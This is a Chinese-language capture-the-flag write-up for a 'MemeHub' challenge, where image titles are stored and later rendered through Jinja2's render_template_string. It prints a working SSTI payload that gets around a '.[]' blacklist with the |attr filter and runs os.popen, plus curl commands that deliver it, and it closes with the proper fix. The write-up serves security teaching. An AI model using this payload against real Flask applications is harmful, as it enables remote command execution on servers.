# MemeHub

## 题目简述

MemeHub 允许用户上传图片并填写标题。服务端只接受 `image/jpeg` 和 `image/png`，同时禁止标题中出现 `.[]`，看起来像是想阻止模板注入。

真正的问题在首页：上传时标题被原样写入 SQLite，展示最新图片时又执行 `render_template_string(current["title"])`。因此标题不是普通数据，而会被 Jinja2 再解释一次，形成持久化服务端模板注入。图片上传只是把恶意标题送入数据库并触发展示，决定性漏洞在标题的二次模板渲染。

## 解题过程

先用简单表达式确认输入会进入 Jinja2：

```jinja2
{{7*7}}
```

上传后访问首页，如果标题显示为 `49`，就证明服务端执行了模板表达式。黑名单只删除三种常见访问符号，并没有限制 `|attr()` 过滤器、函数调用、引号和下划线。于是可以作如下等价替换：

```text
obj.attribute  -> obj|attr('attribute')
obj[index]     -> obj|attr('__getitem__')(index)
obj['key']     -> obj|attr('__getitem__')('key')
```

Jinja2 默认全局对象 `cycler` 的初始化函数可以到达其 Python 全局字典。该字典中已有 `os` 模块，因此不需要依赖随版本变化的 `__subclasses__()` 索引。下面的标题不包含 `.[]`，却可以执行命令并读取输出：

```jinja2
{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat flag.txt')|attr('read')()}}
```

攻击时必须在上传与查看首页之间保留同一个 Flask Session，因为图片记录保存在以 `session["uid"]` 命名的目录中：

```bash
payload="{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat flag.txt')|attr('read')()}}"

curl -s -c cookies.txt \
  -F "title=${payload}" \
  -F "file=@cover.png;type=image/png" \
  http://TARGET/upload

curl -s -b cookies.txt http://TARGET/
```

首页渲染恶意标题后，命令输出进入 `image_title`，最终得到：

```text
shellmates{tR0ll1nG_@_mem3R_w1tH_4_w3ll_cr4fT3d_1nj3ct10n}
```

## 方法总结

本题的关键不是绕过图片格式检查，而是识别“标题先存储、后作为模板源码渲染”的数据流。字符黑名单只封住了最常见的属性和下标写法，Jinja2 的 `attr` 过滤器仍能完成同样的对象遍历，最终从模板上下文进入 Python 模块并执行命令。

修复时应始终使用固定模板，把标题作为数据变量传给 `render_template()`，并依赖 Jinja2 的上下文转义；不能把用户输入交给 `render_template_string()`。即便扩充黑名单，也无法覆盖模板引擎中全部等价语法和可达对象。
